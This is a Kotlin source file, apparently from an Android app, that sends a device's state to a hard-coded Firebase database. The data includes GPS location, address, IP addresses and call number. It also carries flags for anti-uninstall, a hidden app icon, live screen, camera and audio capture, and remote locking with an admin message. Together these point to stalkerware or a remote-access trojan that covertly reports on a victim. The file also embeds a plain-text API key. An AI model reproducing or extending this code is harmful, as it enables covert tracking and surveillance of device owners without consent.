package com.example.data.firebase

import android.util.Log
import com.example.data.model.DeviceState
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class FirebaseSyncManager {
    companion object {
        const val DATABASE_URL = "https://my-project-a03ee-default-rtdb.asia-southeast1.firebasedatabase.app"
        const val PROJECT_ID = "my-project-a03ee"
        const val STORAGE_BUCKET = "my-project-a03ee.firebasestorage.app"
        const val API_KEY = "AIzaSyBa7zGD66GlRrJq5NzTxAPjb7nedvkEIhM"
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(5, TimeUnit.SECONDS)
        .readTimeout(5, TimeUnit.SECONDS)
        .build()

    suspend fun syncDeviceStateToFirebase(state: DeviceState): Boolean = withContext(Dispatchers.IO) {
        try {
            val json = JSONObject().apply {
                put("deviceId", state.deviceId)
                put("deviceName", state.deviceName)
                put("androidVersion", state.androidVersion)
                put("batteryLevel", state.batteryLevel)
                put("isCharging", state.isCharging)
                put("ipAddress", state.ipAddress)
                put("localIp", state.localIp)
                put("latitude", state.latitude)
                put("longitude", state.longitude)
                put("locationAddress", state.locationAddress)
                put("wifiEnabled", state.wifiEnabled)
                put("mobileDataEnabled", state.mobileDataEnabled)
                put("bluetoothEnabled", state.bluetoothEnabled)
                put("locationGpsEnabled", state.locationGpsEnabled)
                put("antiUninstallEnabled", state.antiUninstallEnabled)
                put("flashlightOn", state.flashlightOn)
                put("videoPlaying", state.videoPlaying)
                put("videoUrl", state.videoUrl)
                put("currentWallpaper", state.currentWallpaper)
                put("isLockedV1", state.isLockedV1)
                put("lockV1DurationMinutes", state.lockV1DurationMinutes)
                put("isLockedV2", state.isLockedV2)
                put("lockV2DurationMinutes", state.lockV2DurationMinutes)
                put("lockV2AdminMessage", state.lockV2AdminMessage)
                put("isLiveScreenActive", state.isLiveScreenActive)
                put("isLiveCameraActive", state.isLiveCameraActive)
                put("isLiveAudioActive", state.isLiveAudioActive)
                put("isAppHidden", state.isAppHidden)
                put("callNumber", state.callNumber)
                put("callStatus", state.callStatus.name)
                put("timestamp", System.currentTimeMillis())
            }

            val mediaType = "application/json; charset=utf-8".toMediaType()
            val body = json.toString().toRequestBody(mediaType)
            val request = Request.Builder()
                .url("$DATABASE_URL/devices/${state.deviceId}.json")
                .put(body)
                .build()

            val response = client.newCall(request).execute()
            val success = response.isSuccessful
            response.close()
            success
        } catch (e: Exception) {
            Log.d("FirebaseSync", "Cloud sync note: ${e.message}")
            false
        }
    }
}
